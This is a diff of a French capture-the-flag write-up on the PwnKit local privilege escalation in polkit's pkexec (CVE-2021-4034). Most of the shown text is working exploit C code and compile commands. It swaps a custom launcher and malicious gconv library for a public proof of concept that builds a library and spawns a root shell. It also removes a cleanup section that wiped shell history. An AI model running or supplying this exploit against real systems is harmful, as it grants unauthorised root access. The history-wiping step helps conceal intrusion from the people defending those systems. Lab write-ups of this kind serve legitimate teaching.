@@ -211,53 +211,39 @@ Constructeur pwn() → setuid(0) + cat /root/flag.txt
 mkdir /tmp/pwn && cd /tmp/pwn
 ```
 
-**Fichier `exploit.c` — le lanceur :**
+**Fichier `cve-2021-4034-poc.c` — le lanceur :**
 
 ```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-
-void fatal(const char *msg) { perror(msg); exit(1); }
-
-int main(void) {
-    // argv vide : déclenche l'OOB read dans pkexec (argc = 0)
-    char *argv[] = { NULL };
-
-    // envp forgé : envp[0] sera lu comme argv[0] par pkexec
-    char *envp[] = {
-        "pwnkit.so:.",
-        "PATH=GCONV_PATH=.",
-        "CHARSET=pwnkit",
-        "GCONV_PATH=.",
-        NULL
-    };
-
-    // Création de la structure de répertoires attendue
-    system("mkdir -p 'GCONV_PATH=.'");
-    system("cp /usr/bin/pkexec 'GCONV_PATH=./pwnkit.so:.'");
-    system("mkdir -p 'pwnkit.so:.'");
-
-    execve("/usr/bin/pkexec", argv, envp);
-    fatal("execve");
-}
-```
-
-**Fichier `payload.c` — la bibliothèque malveillante :**
-
-```c
-#define _GNU_SOURCE
+/*
+ * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
+ * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
+ */
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-// Exécuté automatiquement au chargement du .so
-// pkexec tourne en SUID root → setuid(0) fonctionne
-void __attribute__((constructor)) pwn(void) {
-    setuid(0);
-    setgid(0);
-    system("id; cat /root/flag.txt");
+char *shell = 
+	"#include <stdio.h>\n"
+	"#include <stdlib.h>\n"
+	"#include <unistd.h>\n\n"
+	"void gconv() {}\n"
+	"void gconv_init() {\n"
+	"	setuid(0); setgid(0);\n"
+	"	seteuid(0); setegid(0);\n"
+	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
+	"	exit(0);\n"
+	"}";
+
+int main(int argc, char *argv[]) {
+	FILE *fp;
+	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
+	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
+	fp = fopen("pwnkit/pwnkit.c", "w");
+	fprintf(fp, "%s", shell);
+	fclose(fp);
+	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
+	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
+	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
 }
 ```
 
@@ -265,18 +251,10 @@ void __attribute__((constructor)) pwn(void) {
 
 ```bash
 # Compiler la bibliothèque malveillante
-gcc -shared -fPIC -nostartfiles -o pwnkit.so payload.c
-
-# Compiler le lanceur
-gcc -o exploit exploit.c
-
-# Créer la structure de fichiers pour GCONV_PATH
-mkdir -p 'GCONV_PATH=.'
-cp pwnkit.so 'GCONV_PATH=./pwnkit'
-echo "module UTF-8// PWNKIT// pwnkit 2" > 'GCONV_PATH=./gconv-modules'
+gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
 
 # Lancer l'exploit
-./exploit
+./cve-2021-4034-poc
 ```
 
 **Sortie attendue :**
@@ -311,21 +289,6 @@ CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}
 
 ---
 
-## Nettoyage (post-CTF)
-
-```bash
-# Mettre à jour polkit pour corriger la faille
-apt-get install --only-upgrade policykit-1
-
-# Effacer les fichiers temporaires
-rm -rf /tmp/pwn
-
-# Effacer l'historique
-history -c && rm ~/.bash_history
-```
-
----
-
 ## Flags
 
 | Flag | Valeur | Forme déposée sur le disque |
@@ -341,3 +304,4 @@ history -c && rm ~/.bash_history
 - [Qualys Security Advisory](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
 - [Ubuntu Security Notice USN-5252-1](https://ubuntu.com/security/notices/USN-5252-1)
 - [polkit upstream commit de correction](https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683)
+- [Github de l'exploit](https://github.com/arthepsy/CVE-2021-4034/)
